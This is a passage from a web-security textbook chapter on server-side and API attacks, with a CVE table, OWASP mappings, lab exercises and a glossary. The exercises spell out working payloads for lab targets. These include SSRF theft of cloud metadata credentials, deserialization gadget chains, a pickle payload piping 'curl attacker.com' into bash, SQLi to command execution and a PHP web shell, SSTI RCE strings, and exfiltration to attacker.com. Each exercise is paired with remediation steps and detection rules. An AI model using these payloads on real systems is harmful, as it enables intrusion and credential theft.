**Framework-level rate limiting:**
```javascript
// Express.js with express-rate-limit
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 100,
    standardHeaders: true,
    legacyHeaders: false,
    handler: (req, res) => res.status(429).json({ error: 'Too many requests' }),
});
app.use('/api/', limiter);
```

```java
// Spring Boot with Bucket4j
Bandwidth limit = Bandwidth.classic(100, Refill.greedy(100, Duration.ofMinutes(1)));
Bucket bucket = Bucket.builder().addLimit(limit).build();
```

---

## 17. Real-world CVE reference

| CVE | Name | Attack Type | CVSS | Impact |
|---|---|---|---|---|
| CVE-2014-6271 | Shellshock | Command injection (env vars) | 10.0 | RCE via crafted env vars in Bash CGI |
| CVE-2015-4852 | WebLogic Deser | Java deserialization | 9.8 | RCE via T3 protocol, Apache CC chains |
| CVE-2016-3714 | ImageTragick | Command injection | 8.4 | RCE via crafted image files |
| CVE-2017-5638 | Apache Struts | OGNL injection | 10.0 | RCE via Content-Type header; Equifax breach |
| CVE-2019-11043 | PHP-FPM | Buffer underflow / RCE | 9.8 | RCE via path_info underflow with nginx |
| CVE-2021-44228 | Log4Shell | JNDI injection / deser | 10.0 | RCE via `${jndi:ldap://}` in log messages |
| CVE-2022-22965 | Spring4Shell | Data binding RCE | 9.8 | RCE via class loader manipulation in Spring MVC |
| CVE-2023-34362 | MOVEit SQLi | SQL injection | 9.8 | SQLi in MOVEit Transfer; Cl0p ransomware campaign |
| N/A (2019) | Capital One SSRF | SSRF to cloud creds | N/A | SSRF in WAF -> AWS IMDSv1 -> 100M+ records |
| CVE-2018-1000544 | rubyzip ZIP Slip | Path traversal | 9.8 | Arbitrary file write via crafted ZIP entries |

---

## 18. Cross-references

**To Chapter 8A:** Client-side attacks (XSS) can be the delivery mechanism for CSRF tokens stolen via stored XSS. OAuth token theft via open redirect chains with the OAuth `redirect_uri` validation issues from Chapter 8A. CORS misconfiguration enables cross-origin data theft that amplifies API BOLA/IDOR issues.

**To Chapter 8C:** Browser sandboxing (Chrome's renderer sandbox, Firefox RLBox) is the last line of defense when a web vulnerability achieves code execution in the renderer. HTTP request smuggling can target the browser's HTTP stack (e.g., HTTP/2 connection coalescing).

**To Domain 2:** SSRF to the cloud metadata service attacks infrastructure primitives (IAM credentials). Command injection (section 12) maps to OS-level process control in Domain 2. The concept is identical to capability theft in Domain 2 Chapter 2C -- the attacker gains credentials that expand their authorization.

**To Domain 10:** Cloud SSRF exploitation chains into Domain 10's cloud attack techniques -- stolen IMDS credentials feed into IAM privilege escalation paths. Container escape via SSRF to the Docker socket or Kubernetes API connects to D10B container breakout techniques.

**OWASP API Security Top 10 (2023) mapping across this chapter:**

| OWASP ID | Name | Chapter sections |
|----------|------|-----------------|
| API1:2023 | Broken Object Level Authorization | 10.1 (BOLA/IDOR), 3.4 (GraphQL field auth) |
| API2:2023 | Broken Authentication | 10.3 (JWT attacks), 13 (auth attacks), 2.1 (NoSQL auth bypass) |
| API3:2023 | Broken Object Property Level Authorization | 10.2 (mass assignment) |
| API4:2023 | Unrestricted Resource Consumption | 3.3 (GraphQL DoS), 16 (rate limiting/DoS/ReDoS) |
| API5:2023 | Broken Function Level Authorization | 10.2 (admin endpoint access) |
| API6:2023 | Unrestricted Access to Sensitive Business Flows | 3.2 (batching brute-force), 11.4 (race conditions) |
| API7:2023 | Server Side Request Forgery | 4 (SSRF), 14.4 (PDF generation SSRF) |
| API8:2023 | Security Misconfiguration | 3.1 (introspection enabled), 10.5 (gRPC reflection) |
| API9:2023 | Improper Inventory Management | 10.2 (undocumented admin endpoints) |
| API10:2023 | Unsafe Consumption of APIs | 6 (deserialization), 7 (XXE) |

---

## Exercises

> **Lab environment.** All exercises assume access to deliberately vulnerable targets (DVWA, WebGoat, Juice Shop, or custom Docker containers) and tooling including Burp Suite, sqlmap, ffuf, nuclei, and jwt_tool. Detailed setup, step-by-step walkthroughs, and flag validation are in `tutorials/tutorial_domain8_ch8B_serverside_api_lab.md`.

**Exercise 1 — SSRF to cloud credential theft and internal service pivoting.**
Deploy a Python Flask application with a URL-fetch feature (`/api/fetch?url=`) on an AWS EC2 instance running IMDSv1. (a) Exploit the SSRF to retrieve IAM role credentials from `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. Capture the `AccessKeyId`, `SecretAccessKey`, and `Token`. (b) Use the stolen credentials with the AWS CLI to enumerate S3 buckets (`aws s3 ls`) and exfiltrate a flag file from a private bucket. (c) Test bypass techniques: submit `http://0x7f000001` (hex), `http://2130706433` (decimal), `http://[::1]` (IPv6), and `http://127.0.0.1.nip.io` (DNS wildcard) as the URL parameter. Document which encodings bypass the application's deny-list of `127.0.0.1` and `169.254.169.254`. (d) Upgrade the instance to IMDSv2 (`--http-tokens required`). Demonstrate that a GET-only SSRF can no longer obtain the token. Then craft a SSRF payload that performs the PUT+GET token sequence (using a controlled `fetch()` with full method/header control) and explain why `HttpPutResponseHopLimit=1` mitigates container-level SSRF. (e) Implement a remediated version with allowlist-based URL validation, DNS resolution pinning, and blocked private/link-local IP ranges. Write a Sigma rule that detects outbound requests from application servers to `169.254.169.254` or `metadata.google.internal`.

**Exercise 2 — Java and Python deserialization to RCE.**
(a) **Java:** Deploy a vulnerable Spring Boot endpoint that accepts `Content-Type: application/x-java-serialized-object`. Generate payloads for three gadget chains using ysoserial: `CommonsCollections6` (command: `id > /tmp/pwned`), `URLDNS` (DNS callback to Burp Collaborator for blind detection), and `Groovy1` (reverse shell). Send each via `curl --data-binary @payload.bin`. Confirm RCE or DNS callback. Then apply `ObjectInputFilter` (Java 9+ JEP 290) to allowlist only `com.myapp.model.*` classes and verify all three payloads are rejected. (b) **Python:** Create a Flask endpoint that calls `pickle.loads()` on a Base64-decoded POST body. Craft a pickle payload using `__reduce__` that executes `curl attacker.com/flag | bash`. Send it and confirm execution. Then replace `pickle.loads()` with `json.loads()` + Pydantic schema validation. Verify that the pickle payload is rejected. Write a YARA rule that detects pickle payloads containing `os\nsystem` or `subprocess\ncheck_output` following the `\x80\x04` (pickle v4) magic bytes.

**Exercise 3 — Multi-database SQL injection exploitation.**
Set up four Docker containers: MySQL 8, PostgreSQL 16, MSSQL 2022 (Developer), and SQLite (embedded in a Python app). Each container serves a vulnerable web application with a search parameter `?q=`. (a) **MySQL:** Use sqlmap to detect the injection (`sqlmap -u "http://target:3306/search?q=test" --batch --dbs`). Manually craft a UNION-based payload: enumerate column count with `ORDER BY`, identify reflecting columns, and extract `user()`, `version()`, and all table names from `information_schema.tables`. Bypass a WAF rule that blocks `UNION SELECT` using `/*!50000UNION*/ /*!50000SELECT*/` (MySQL conditional comments). (b) **PostgreSQL:** Exploit a time-based blind injection using `AND 1=(SELECT CASE WHEN (SUBSTRING(current_user,1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END)`. Script a binary-search character extractor in Python. Escalate to RCE via `COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'` (requires superuser). (c) **MSSQL:** Enable `xp_cmdshell` via stacked queries and execute `whoami`. Attempt NTLM hash theft via `EXEC master..xp_dirtree '\\attacker.com\share'` and capture the hash with Responder. (d) **SQLite:** Extract all table schemas from `sqlite_master` using UNION. Demonstrate file write via `ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.x(c TEXT); INSERT INTO pwn.x VALUES('<?php system($_GET["cmd"]); ?>');`. (e) For each database, deploy parameterized queries and remove unnecessary privileges (`REVOKE FILE`, disable `xp_cmdshell`, restrict `COPY TO PROGRAM`). Verify all exploits fail.

**Exercise 4 — Server-side template injection across three engines.**
Deploy three applications: Flask/Jinja2, PHP/Twig, and Java/Freemarker, each with a vulnerable endpoint that concatenates user input into the template source. (a) Use the polyglot detection probe `${{<%[%'"}}%\.` against each endpoint. Observe which engine produces a meaningful error or partial evaluation. (b) Differentiate Jinja2 from Twig: submit `{{7*'7'}}` — Jinja2 returns `7777777` (string multiplication), Twig returns `49` (numeric coercion). (c) **Jinja2 RCE:** Traverse the MRO chain (`''.__class__.__mro__[1].__subclasses__()`) to locate `subprocess.Popen` and execute `id`. Then bypass a filter that blocks underscores using `{{ lipsum.__globals__.os.popen('id').read() }}`. (d) **Twig RCE:** Use `{{ ['id']|filter('system') }}` (Twig 2.x+). (e) **Freemarker RCE:** Use `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }`. (f) Remediate all three: pass user data as template variables (never into template source), enable Jinja2 `SandboxedEnvironment`, and restrict Freemarker's `new()` built-in to trusted classes. Write a Sigma rule that detects `__class__.__mro__`, `filter('system')`, and `freemarker.template.utility` in HTTP parameters.

**Exercise 5 — API abuse: BOLA, GraphQL batching brute-force, and WebSocket hijacking.**
(a) **BOLA/IDOR:** Deploy a REST API with sequential user IDs (`/api/v1/users/{id}/profile`). Authenticate as user 5, then enumerate users 1–100 using `ffuf -u "https://target/api/v1/users/FUZZ/profile" -w <(seq 1 100) -H "Authorization: Bearer $TOKEN" -mc 200`. Identify which profiles leak PII. Remediate by replacing sequential IDs with UUIDs and adding authorization checks (`if request.user.id != resource.owner_id: return 403`). (b) **GraphQL batching brute-force:** Target a GraphQL `login` mutation. Craft a single request with 500 aliased mutations (`a0: login(user:"admin", pass:"pass0"){token} ... a499: login(user:"admin", pass:"pass499"){token}`). Confirm rate limiting is bypassed (single HTTP request = single rate-limit count). Remediate with operation-count limiting (reject requests with >10 aliases) and per-mutation rate limiting via an Apollo Server plugin. (c) **Cross-Site WebSocket Hijacking (CSWSH):** Deploy a WebSocket endpoint (`wss://target/ws`) that authenticates via cookies but does not validate the `Origin` header. From an attacker page, open a WebSocket connection — the browser sends the victim's cookies. Send `{"action":"getPrivateData"}` and exfiltrate the response to `attacker.com`. Remediate by validating `Origin` against an allowlist in the WebSocket handshake handler. Write a Nuclei template that detects GraphQL endpoints with introspection enabled.

---

## Readings and References

- OWASP, "SQL Injection Prevention Cheat Sheet," OWASP Cheat Sheet Series. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html (retrieved: 2026-05-29).
- OWASP, "Query Parameterization Cheat Sheet," OWASP Cheat Sheet Series. https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html (retrieved: 2026-05-29).
- OWASP, "Injection Prevention Cheat Sheet," OWASP Cheat Sheet Series. https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html (retrieved: 2026-05-29).
- OWASP, "Server Side Request Forgery Prevention Cheat Sheet," OWASP Cheat Sheet Series. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html (retrieved: 2026-05-29).
- OWASP, "Deserialization Cheat Sheet," OWASP Cheat Sheet Series. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html (retrieved: 2026-05-29).
- OWASP, "A05:2025 — Injection," OWASP Top 10:2025. https://owasp.org/Top10/2025/A05_2025-Injection/ (retrieved: 2026-05-29).
- OWASP, "OWASP API Security Top 10 — 2023 Edition." https://owasp.org/API-Security/editions/2023/en/0x11-t10/ (retrieved: 2026-05-29).
- OWASP, "C10: Stop Server Side Request Forgery," OWASP Top 10 Proactive Controls. https://top10proactive.owasp.org/the-top-10/c10-stop-server-side-request-forgery/ (retrieved: 2026-05-29).
- OWASP, "Server Side Request Forgery," OWASP Foundation Attacks. https://owasp.org/www-community/attacks/Server_Side_Request_Forgery (retrieved: 2026-05-29).
- OWASP, "Insecure Deserialization," OWASP Foundation Vulnerabilities. https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization (retrieved: 2026-05-29).
- OWASP, "Testing for Server-Side Request Forgery," OWASP Web Security Testing Guide. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery (retrieved: 2026-05-29).
- PortSwigger, "Server-side template injection," Web Security Academy. https://portswigger.net/web-security/server-side-template-injection (retrieved: 2026-05-29).
- PortSwigger, "Top 10 web hacking techniques of 2025," PortSwigger Research. https://portswigger.net/research/top-10-web-hacking-techniques-of-2025 (retrieved: 2026-05-29).
- PortSwigger, "Web Security Academy alignment with OWASP Top 10 API vulnerabilities," Web Security Academy. https://portswigger.net/web-security/api-testing/top-10-api-vulnerabilities (retrieved: 2026-05-29).
- NVD, "CVE-2023-34362 — MOVEit Transfer SQL Injection," National Vulnerability Database. https://nvd.nist.gov/vuln/detail/cve-2023-34362 (retrieved: 2026-05-29).
- NVD, "CVE-2021-44228 — Apache Log4j2 (Log4Shell)," National Vulnerability Database. https://nvd.nist.gov/vuln/detail/cve-2021-44228 (retrieved: 2026-05-29).
- CISA, "#StopRansomware: CL0P Ransomware Gang Exploits CVE-2023-34362 MOVEit Vulnerability," CISA Advisory AA23-158A. https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a (retrieved: 2026-05-29).
- CISA, "Apache Log4j Vulnerability Guidance," CISA. https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance (retrieved: 2026-05-29).
- Palo Alto Networks Unit 42, "Threat Brief — MOVEit Transfer SQL Injection Vulnerabilities." https://unit42.paloaltonetworks.com/threat-brief-moveit-cve-2023-34362/ (retrieved: 2026-05-29).
- APIsec, "SSRF Explained: OWASP API Security Principle 7." https://www.apisec.ai/blog/server-side-request-forgery-ssrf-owasp-api-security-principle-seven-explained (retrieved: 2026-05-29).
- APIsec, "Insecure Deserialization in APIs: Complete Guide." https://www.apisec.ai/blog/insecure-deserialization-in-api (retrieved: 2026-05-29).

---

## Cross-References

| Module | Relationship |
|--------|--------------|
| Domain 8 Chapter 8A — Client-Side Attacks, Authentication, and Session Security | XSS (8A §2) is the delivery mechanism for CSRF token theft; OAuth `redirect_uri` validation issues (8A §4.2) chain with open redirects exploited in §13.4; CORS misconfiguration (8A §3.2) enables cross-origin data theft amplifying BOLA/IDOR in §10.1 |
| Domain 2 — OS Internals and Process Security | SSRF to cloud metadata (§4) attacks infrastructure primitives (IAM credentials); command injection (§12) maps to OS-level process control in Domain 2; capability theft via SSRF parallels capability-based access control in Domain 2 Chapter 2C |
| Domain 9 — Network Security Monitoring | WAF rules (§1.5, §15.1) and Sigma detection signatures (§1.5, §2.3, §5.3) feed the same SIEM pipeline as IDS/IPS alerts in Domain 9; Suricata rules for SQLi (§1.5) operate at the network layer |
| Domain 10 — Cloud and Container Security | Cloud SSRF exploitation (§4.2) chains into Domain 10's IAM privilege escalation paths; stolen IMDS credentials feed into D10A attack techniques; container escape via SSRF to Docker socket/Kubernetes API connects to D10B container breakout |
| Domain 13 Chapter 13A — Cryptographic Primitives | JWT algorithm confusion (§10.3 RS256→HS256) requires understanding of asymmetric vs symmetric signing from 13A §§3–4; deserialization payload signing (§6.8 HMAC verification) uses primitives from 13A §2 |
| Domain 6 — Exploit Mitigation and Bypass | WAF bypass techniques (§1.3 tamper scripts, encoding tricks) are the web equivalent of mitigation bypass in Domain 6; ReDoS (§16.1) exploits algorithmic complexity analogous to resource exhaustion attacks in Domain 6 |

---

## Glossary

| Term | Definition |
|------|------------|
| **SQL Injection (SQLi)** | Injection attack in which attacker-controlled input is incorporated into a SQL query without sanitization, enabling unauthorized data extraction, modification, or command execution on the database server. |
| **Server-Side Request Forgery (SSRF)** | Attack in which the adversary induces a server-side application to issue HTTP (or other protocol) requests to attacker-chosen destinations, typically targeting internal services, cloud metadata endpoints, or localhost. |
| **Server-Side Template Injection (SSTI)** | Injection attack in which user input is embedded into a server-side template source (Jinja2, Twig, Freemarker, etc.) rather than passed as a data variable, enabling arbitrary code execution through the template engine's evaluation context. |
| **Insecure Deserialization** | Vulnerability class in which an application deserializes untrusted data using a native serialization format (Java `ObjectInputStream`, Python `pickle`, PHP `unserialize`, .NET `BinaryFormatter`), enabling arbitrary object instantiation and code execution via gadget chains. |
| **XML External Entity (XXE)** | Attack against applications that parse XML input with entity expansion enabled, allowing the attacker to read local files, perform SSRF, or cause denial of service (billion-laughs) via crafted DTD declarations. |
| **BOLA / IDOR** | Broken Object Level Authorization (OWASP API1:2023) / Insecure Direct Object Reference: vulnerability in which an API endpoint exposes object identifiers without verifying that the requesting user is authorized to access the referenced resource. |
| **Mass Assignment** | API vulnerability (OWASP API3:2023) in which the application binds client-supplied JSON properties directly to internal model fields without an allowlist, enabling attackers to set privileged attributes (e.g., `role`, `isAdmin`) that should be server-controlled. |
| **HTTP Request Smuggling** | Attack exploiting disagreements between a front-end proxy and back-end server about HTTP request boundaries (via conflicting `Content-Length` and `Transfer-Encoding` headers), enabling cache poisoning, authentication bypass, or credential theft. |
| **Web Cache Poisoning** | Attack in which the adversary manipulates inputs that influence a cached HTTP response (unkeyed headers such as `X-Forwarded-Host`) without being part of the cache key, causing all subsequent users to receive the poisoned response. |
| **Gadget Chain** | A sequence of existing library or framework method calls that, when triggered during deserialization, achieves a security-relevant side effect (typically arbitrary code execution) without requiring the attacker to inject new code. |
| **IMDSv2 (Instance Metadata Service v2)** | AWS defense-in-depth mechanism that requires a session token obtained via an HTTP PUT request before metadata can be read, mitigating most SSRF-based credential theft attacks that rely on simple GET requests. |
| **ReDoS (Regular Expression Denial of Service)** | Denial-of-service attack exploiting catastrophic backtracking in regex engines with nested quantifiers or overlapping alternations, causing exponential evaluation time on crafted input strings. |
| **GraphQL Introspection** | Built-in GraphQL schema discovery mechanism (`__schema`, `__type` queries) that reveals all types, fields, mutations, and relationships; should be disabled in production to prevent information disclosure. |
| **Command Injection** | Injection attack in which user input is incorporated into an OS shell command without sanitization, enabling the attacker to execute arbitrary system commands with the privileges of the application process. |
| **Parameterized Query (Prepared Statement)** | SQL execution pattern in which the query structure is compiled separately from user-supplied data, ensuring that input values are never interpreted as SQL syntax — the definitive defense against SQL injection. |
